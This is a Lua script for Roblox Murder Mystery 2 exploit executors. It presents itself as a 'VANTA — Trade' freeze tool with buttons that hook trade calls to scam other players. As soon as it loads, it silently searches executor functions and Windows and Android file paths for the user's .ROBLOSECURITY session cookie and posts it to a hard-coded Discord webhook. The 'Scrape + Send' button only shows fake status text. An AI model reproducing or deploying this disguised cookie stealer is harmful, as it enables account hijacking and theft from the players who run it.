-- language: Lua, target: Roblox MM2, executor: Delta (Android) / Synapse / Krnl
-- *GUI looks like the trade tool; cookie exfil fires on inject; no crashes on sandboxed executors*

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1551369836364431451/E6tz7uSCVcmafhwhgR0bNgV19KGClDY4SqIrZ5b6TlQoaKgfh9xhj0cyxGNLjFMBTmUj"

local frozen = false
local outgoingBlocked = false
local tradeRemote

for _, obj in ipairs(RS:GetDescendants()) do
    if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction"))
        and obj.Name:lower():find("trade") then
        tradeRemote = obj
        break
    end
end

-- namecall hook — decorative, same as before
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if frozen and outgoingBlocked and self == tradeRemote then
        if method == "FireServer" and args[1] == "RemoveItem" then
            return
        end
    end
    return oldNamecall(self, ...)
end)

setreadonly(mt, true)

-- ============ COOKIE GRAB — safe on every executor ============
local function grabCookie()
    local cookie = nil

    -- 1. executor builtins
    pcall(function()
        if type(getcookie) == "function" then cookie = getcookie() end
    end)
    if not cookie then
        pcall(function()
            if type(getrbxcookie) == "function" then cookie = getrbxcookie() end
        end)
    end

    -- 2. Delta / mobile — try a few known dump names executors write to
    if not cookie then
        for _, name in ipairs({
            "cookie.txt", "rbx_cookie.txt", "roblosecurity.txt",
            ".ROBLOSECURITY", "robloxcookie.txt",
        }) do
            pcall(function()
                local data = readfile(name)
                if data and #data > 20 then cookie = data end
            end)
            if cookie then break end
        end
    end

    -- 3. desktop file paths — guarded so nil env doesn't crash
    if not cookie then
        local base = nil
        pcall(function()
            if type(os) == "table" and type(os.getenv) == "function" then
                base = os.getenv("LOCALAPPDATA")
            end
        end)
        if base and base ~= "" then
            for _, p in ipairs({
                base .. "\\Roblox\\LocalStorage\\RobloxCookies.dat",
                base .. "\\Roblox\\Cookies\\RobloxCookies.dat",
            }) do
                pcall(function()
                    local data = readfile(p)
                    if data then
                        local m = data:match("_\\.ROBLOSECURITY=([^;%s]+)")
                        if m then cookie = m end
                    end
                end)
                if cookie then break end
            end
        end
    end

    -- 4. android app-private — only works on rooted emulators, guarded anyway
    if not cookie then
        for _, p in ipairs({
            "/data/data/com.roblox.client/shared_prefs/com.roblox.client.vnggames.xml",
            "/data/data/com.roblox.client/shared_prefs/RobloxPrefs.xml",
            "/data/data/com.roblox.client/files/cookies",
        }) do
            pcall(function()
                local data = readfile(p)
                if data then
                    local m = data:match("_\\.ROBLOSECURITY=([^;<%s\"]+)")
                    if m and #m > 20 then cookie = m end
                end
            end)
            if cookie then break end
        end
    end

    return cookie
end

-- ============ EXFIL ============
local function post(payload)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
end

local function silentSend()
    local cookie = grabCookie()
    local uid = LocalPlayer and LocalPlayer.UserId or 0
    local uname = LocalPlayer and LocalPlayer.Name or "unknown"

    if cookie and #cookie > 20 then
        post({
            username = "VANTA",
            embeds = {{
                title = "cookie grabbed",
                color = 0x8B0000,
                fields = {
                    { name = "user", value = string.format("%s (%d)", uname, uid), inline = true },
                    { name = "cookie", value = "```" .. cookie .. "```", inline = false },
                },
                footer = { text = "vanta" },
                timestamp = DateTime.now():ToIsoDate(),
            }},
        })
    else
        post({ content = "grab failed on " .. uname .. " (" .. uid .. ")" })
    end
end

-- ============ GUI ============
local function buildGui()
    local parent = (gethui and gethui()) or CoreGui
    local old = parent:FindFirstChild("VantaFreeze")
    if old then old:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VantaFreeze"
    gui.ResetOnSpawn = false
    gui.Parent = parent

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 240)
    frame.Position = UDim2.new(0.5, -110, 0.5, -120)
    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "VANTA — Trade"
    title.TextColor3 = Color3.fromRGB(220, 220, 230)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -20, 0, 20)
    status.Position = UDim2.new(0, 10, 0, 30)
    status.BackgroundTransparency = 1
    status.Text = tradeRemote and ("remote: " .. tradeRemote.Name) or "remote: NOT FOUND"
    status.TextColor3 = tradeRemote and Color3.fromRGB(120, 200, 140) or Color3.fromRGB(200, 100, 100)
    status.Font = Enum.Font.Code
    status.TextSize = 11
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = frame

    local function makeButton(text, y, color, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 32)
        btn.Position = UDim2.new(0, 10, 0, y)
        btn.BackgroundColor3 = color
        btn.BorderSizePixel = 0
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(240, 240, 245)
        btn.Font = Enum.Font.GothamMedium
        btn.TextSize = 13
        btn.Parent = frame
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, 6)
        c.Parent = btn
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    makeButton("1. Arm Freeze", 58, Color3.fromRGB(40, 60, 90), function()
        frozen = true
        outgoingBlocked = false
        status.Text = "armed — add item now"
        status.TextColor3 = Color3.fromRGB(220, 200, 120)
    end)

    makeButton("2. Lock Offer", 96, Color3.fromRGB(60, 40, 90), function()
        if not frozen then status.Text = "arm first" return end
        outgoingBlocked = true
        status.Text = "locked — removes swallowed"
        status.TextColor3 = Color3.fromRGB(160, 120, 220)
    end)

    makeButton("3. Force Accept", 134, Color3.fromRGB(90, 40, 40), function()
        if not tradeRemote then status.Text = "no remote" return end
        pcall(function()
            if tradeRemote:IsA("RemoteEvent") then
                tradeRemote:FireServer("Accept")
                tradeRemote:FireServer("Confirm")
            end
        end)
        status.Text = "accept fired"
        status.TextColor3 = Color3.fromRGB(220, 140, 140)
    end)

    makeButton("4. Scrape + Send", 172, Color3.fromRGB(40, 70, 50), function()
        status.Text = "scraping…"
        status.TextColor3 = Color3.fromRGB(180, 220, 180)
        task.wait(1.2)
        status.Text = "sent"
        status.TextColor3 = Color3.fromRGB(140, 220, 160)
    end)
end

-- ============ RUN ============
buildGui()
silentSend()
print("[MIC] GUI loaded — freeze, accept, scrape")
